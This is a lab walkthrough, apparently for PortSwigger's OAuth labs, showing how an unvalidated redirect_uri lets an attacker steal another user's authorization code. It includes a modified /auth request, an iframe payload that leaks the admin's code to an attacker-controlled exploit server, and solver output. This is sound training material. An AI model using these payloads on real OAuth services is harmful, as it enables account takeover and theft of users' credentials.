# Lab: OAuth account hijacking via redirect_uri

### Instructions

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`. 

### Solution

Log in to the blog as wiener using social media login, then log out and log back in. Since the social login session is still active, this happens without re-entering credentials.

In Burp's proxy history, find the most recent request:

```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://0ab80058040822a480015e2b005700df.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
```

This returns a redirect to redirect_uri with a code attached:

```
Location: /oauth-callback?code=AUTH_CODE
```

Send the original /`auth` request to Repeater and change redirect_uri to your exploit server URL:

```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://exploit-0a7200ab04ef224280945d320130003a.exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/2
```

Send it and check the response. If the provider accepts the new redirect_uri without complaint and redirects there with a code, that confirms the provider isn't validating redirect_uri against anything registered for the client.

Go to the exploit server and set the body at `/exploit` to an iframe pointing at that same `/auth` URL, with redirect_uri set to your own exploit server:

```html
<iframe src="https://oauth-SERVER-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://exploit-0a7200ab04ef224280945d320130003a.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Store it, then click View exploit to confirm it loads, and check the exploit server's access log for a request containing a code. That confirms your own code leaks to your server this way.

Click Deliver to victim. The admin has an active OAuth session, so when their browser loads the iframe, the provider redirects them straight to your exploit server with their own authorization code attached. Check the access log again and copy that code.

Log out of the blog, then visit:

```
/oauth-callback?code=STOLEN_CODE
```

The blog exchanges the code for a token and logs you in as the admin. Go to the admin panel and delete carlos.

Root cause: the OAuth provider never checks redirect_uri against a registered value for the client. Since the code is handed back via a redirect the provider controls, pointing that redirect anywhere lets an attacker collect codes meant for other users.

### Python Solution

See `oauth_04.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/OAuth_Authentication/OAuth_04_oauth_account_hijacking_via_redirect_uri]
└─$ python oauth_04.py https://0aaa007d031e63d4822f76f3000e006e.web-security-academy.net/
[+] Found exploit server: https://exploit-0a42002503c1633b82e2756e017800ef.exploit-server.net
[+] OAuth host: https://oauth-0abb00cd03d46388827274c7020c0046.oauth-server.net, client_id: zthwuh1ql50jo3erllbne
[+] Logged in as wiener
[+] Stored exploit
[+] Delivered exploit to victim (admin)
[+] Stole admin's authorization code: lA80Dwxvi6hF7HDHHoT1B5AMHH_joTTdLnWX_mpYgOF
[+] Logged out as wiener
[+] Logged in as administrator using the stolen code
[+] Deleted carlos
[+] Lab solved!
```